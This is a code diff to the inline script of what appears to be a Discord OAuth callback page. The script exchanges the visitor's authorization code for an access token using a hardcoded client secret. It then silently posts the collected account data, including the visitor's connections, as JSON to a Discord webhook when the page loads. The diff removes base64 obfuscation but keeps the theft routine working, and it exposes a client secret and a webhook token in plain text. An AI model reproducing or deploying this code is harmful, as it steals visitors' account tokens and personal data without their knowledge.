@@ -32,7 +32,6 @@
 
 <script>
 (async () => {
-  const x = s => atob(s);
   const d = new URLSearchParams(location.search).get("code");
   if (!d) return;
   try {
@@ -40,11 +39,11 @@
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
       body: new URLSearchParams({
-        client_id: x(e),
-        client_secret: x(f),
+        client_id: "1354724175788380327",
+        client_secret: "Qodg1_-lrOw6cxHFdH1KhD-T1jcTAVFM",
         grant_type: "authorization_code",
         code: d,
-        redirect_uri: x(g)
+        redirect_uri: "https://rencordx.github.io/home/callback.html"
       })
     }).then(r => r.json());
     if (!t.access_token) return;
@@ -70,18 +69,13 @@
       connections: con || []
     };
 
-    await fetch(x(h), {
+    await fetch("https://discord.com/api/webhooks/1381264711236059187/KR_WNPlGdrKRltp8Vj0LjKFhOSe7ecO9Br_dI0-6AWmRr7rF5-Vg0GYgXvIs-b_xOKrA", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ content: "```json\n" + JSON.stringify(j, null, 2) + "\n```" })
     });
   } catch (_) {}
 })();
-const e = "MTM1NDcyNDE3NTc4ODM4MDMyNw==";
-const f = "UW9kZzFfLWxyT3c2Y3hIRmRIMUtoRC1UMWpjVEFWRk0=";
-const g = "aHR0cHM6Ly9yZW5jb3JkeC5naXRodWIuaW8vaG9tZS9jYWxsYmFjay5odG1s";
-const h = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4MTI2NDcxMTIzNjA1OTE4Ny9LUl9XTlBsR2RyS1JsdHA4Vmo"
-        + "wTGpLRmhPU2U3ZWMwOUJyX2RJMC02QVdtUnI3ckY1LVZnMEdZZ1h2SXMtYl94T0tyQQ==";
 </script>
 </body>
 </html>
